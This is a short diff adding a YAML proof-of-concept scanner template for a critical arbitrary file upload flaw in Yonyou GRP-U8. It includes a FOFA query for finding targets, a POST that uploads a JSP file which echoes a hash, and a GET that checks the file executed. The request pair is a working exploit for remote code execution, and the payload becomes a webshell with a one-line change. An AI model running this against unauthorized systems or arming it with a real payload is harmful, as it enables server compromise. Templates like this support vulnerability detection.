@@ -1,0 +1,22 @@
+id: poc-yaml-yongyou-grp-u8-fileupload-anyfile-upload
+info:
+  name: 用友GRP-U8 FileUpload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: GRP-U8
+  fofa: app="用友-GRP-U8"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /servlet/FileUpload?fileName={{.t1}}.jsp&actionID=update
+  headers:
+    Content-Type: text/plain; charset=utf-8
+  data: <%out.println("{{.t2}}");%>
+  expression: status_code == 200 && !contains(body,"<")
+- method: GET
+  path: /R9iPortal/upload/{{.t1}}.jsp
+  expression: status_code == 200 && contains(body,t2) && !contains(body,"<")
+transport: http
